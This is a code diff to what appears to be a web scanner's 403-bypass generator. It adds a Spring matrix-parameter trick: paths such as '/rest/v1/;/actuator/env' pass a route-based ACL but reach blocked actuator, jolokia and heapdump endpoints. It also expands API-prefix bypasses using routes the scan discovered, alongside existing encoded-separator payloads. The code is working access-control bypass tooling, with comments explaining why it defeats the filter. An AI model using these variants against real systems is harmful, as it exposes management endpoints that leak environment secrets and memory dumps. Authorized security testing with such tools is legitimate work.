@@ -125,6 +125,25 @@ _ENC_SEP = ("%c0%af", "%e0%80%af", "%ef%bc%8f", "%uff0f", "%25c0%25af")
 _API_PREFIXES = ("v1", "v2", "v3", "api", "v1.0", "latest", "internal")
 _VER_SEG = re.compile(r"/(?:v\d+(?:\.\d+)?|api)(?=/)", re.I)   # a version-ish path segment to strip
 
+# Matrix-param management bypass: reach a blocked actuator/JMX endpoint through a
+# `;/` matrix segment carried on a *mapped* controller route. A Spring Security
+# rule (or gateway ACL) that string-matches `/actuator/**` is evaluated BEFORE
+# Spring MVC strips the `;matrix` content — so `/rest/v1/;/actuator/env` is
+# authorized as the allowed `/rest/v1` yet still dispatched to the actuator
+# endpoint. High-signal on Spring/Java stacks; the caller gates it to
+# management-ish paths so it never inflates an ordinary 403's budget.
+_MGMT_MATRIX_PREFIXES = ("rest/v1", "rest/v2", "rest/v1/v2", "rest", "api",
+                         "api/v1", "api/v2", "v1", "v2")
+_MGMT_HINT = re.compile(
+    r"(?:^|/)(?:actuator|management|monitoring|jolokia|heapdump|threaddump|beans|"
+    r"configprops|mappings|loggers|env|metrics|gateway|prometheus)(?:/|$)", re.I)
+
+
+def is_management_path(path: str) -> bool:
+    """True when `path` looks like a Spring/JMX management endpoint — the class
+    the matrix-param prefix bypass targets (actuator, jolokia, gateway…)."""
+    return bool(_MGMT_HINT.search(path))
+
 
 def _swapcase(p: str) -> str:
     return "/" + p.lstrip("/").swapcase()
@@ -133,6 +152,7 @@ def _swapcase(p: str) -> str:
 def variants(path: str, case_insensitive: bool = False,
              header_pairs: list[tuple[str, str]] | None = None, *,
              intensity: str = "auto", encoded: bool = True, api: bool = True,
+             mgmt: bool = False, route_prefixes: tuple[str, ...] = (),
              ) -> list[tuple[str, str, str, dict]]:
     """Curated 403-bypass attempts for `path` (deduped, order = likelihood).
 
@@ -151,6 +171,11 @@ def variants(path: str, case_insensitive: bool = False,
                   + API-prefix IF `api` (the gates are set from the fingerprint by
                   the caller, so stack-specific tricks fire only where they fit);
       * "full"  — everything, gates ignored (exhaustive).
+
+    `route_prefixes` are real route mounts the scan already confirmed (2xx dirs);
+    they feed BOTH the api-prefix family (`/<route>/blocked`) and the matrix
+    management family (`/<route>/;/blocked`), so those aren't limited to the
+    static seed lists — app-specific mounts are covered from observed data.
     """
     inc_hop = intensity in ("auto", "full")
     inc_enc = intensity == "full" or (intensity == "auto" and encoded)
@@ -224,11 +249,26 @@ def variants(path: str, case_insensitive: bool = False,
     # --- API version-prefix bypass — add a version segment the ACL may not cover,
     # and (if the path already has one) strip it. Gated to API-ish targets. ---
     if inc_api:
-        for ver in _API_PREFIXES:
-            add(f"api-prefix /{ver}{p}", "GET", f"/{ver}{p}", {})
+        # Curated version seeds PLUS any real route prefixes the scan observed
+        # (`route_prefixes`) — so this isn't limited to a static guess list; the
+        # data-driven part covers app-specific mounts (/rest/v1, /gateway…).
+        for ver in dict.fromkeys(_API_PREFIXES + tuple(route_prefixes)):
+            seg = ver.strip("/")
+            if seg:
+                add(f"api-prefix /{seg}{p}", "GET", f"/{seg}{p}", {})
         stripped = _VER_SEG.sub("", p, count=1)
         if stripped and stripped != p:
             add(f"api-strip {stripped}", "GET", stripped, {})
+
+    # --- matrix-param management bypass — carry the blocked management path on a
+    # mapped route + `;/` so the ACL authorizes the route while MVC dispatches to
+    # the endpoint. Curated Spring route guesses plus any real 2xx routes the
+    # caller discovered (`mgmt_prefixes`); "" is the bare-root `/;/…` form. ---
+    if mgmt:
+        for pre in dict.fromkeys(("",) + _MGMT_MATRIX_PREFIXES + tuple(route_prefixes)):
+            pre = pre.strip("/")
+            rpath = f"/;/{body}" if not pre else f"/{pre}/;/{body}"
+            add(f"matrix-bypass {rpath}", "GET", rpath, {})
 
     # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
     # return no body and TRACE just echoes, so they'd be false bypasses). Verb
